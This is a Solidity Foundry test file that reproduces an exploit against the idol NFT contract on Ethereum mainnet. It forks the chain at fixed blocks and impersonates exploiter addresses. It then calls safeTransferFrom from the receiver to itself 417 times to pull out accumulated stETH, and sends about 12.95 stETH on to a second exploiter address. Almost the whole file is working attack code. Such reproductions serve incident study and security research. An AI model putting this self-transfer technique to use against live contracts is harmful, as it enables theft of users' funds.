// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "../interface.sol";
import "../basetest.sol";

interface IToken {
    function safeTransferFrom(
    address from,
    address to,
    uint256 tokenId,
    bytes memory _data
  ) external;
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address from,address to,uint tokenid) external;
  function transfer(address account ,uint amount) external returns (bool);
  function ownerOf(uint tokenid) external returns (address);
}
contract idolNFT is BaseTestWithBalanceLog {
    string constant RPC_URL = "https://ethereum-rpc.publicnode.com";
    address exploiter_addr1 = 0xE546480138D50Bb841B204691C39cC514858d101;
    address exploiter_addr2 = 0x8152970a81f558d171a22390E298B34Be8d40CF4;
    address receiver = 0x22d22134612C0741EBDb3B74a58842D6E74E3b16;
    IToken idolToken  = IToken(0x439cac149B935AE1D726569800972E1669d17094);
    IToken stETH = IToken(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    function setUp() public {
        vm.label(address(stETH), "Lido : stETH");
        vm.label(address(exploiter_addr1), "exploiter_addr1");
        vm.label(address(exploiter_addr2), "exploiter_addr2");
        vm.label(address(receiver), "receiver");
    }
    function transferNFT() public{
        vm.createSelectFork(RPC_URL, 21624236);
        vm.startPrank(exploiter_addr1);
        idolToken.transferFrom(exploiter_addr1, receiver, 940);
        vm.stopPrank();
    }
    function testExploit() public {
        vm.createSelectFork(RPC_URL, 21624239);
        transferNFT();
        console.log("[+] Before Exploit balance", stETH.balanceOf(receiver));
        vm.startPrank(receiver);
        for(uint i=0; i<417; i++){
            //console.log("[+] Start Exploit : ",i+1);
            idolToken.safeTransferFrom(receiver, receiver, 940, "");
        }
        assertEq(stETH.balanceOf(receiver),12950523927926154327);
        stETH.transfer(exploiter_addr2,stETH.balanceOf(receiver));
        vm.stopPrank();
        
        console.log("[+] After Exploit balance", stETH.balanceOf(exploiter_addr2)/10**18);
    }
}
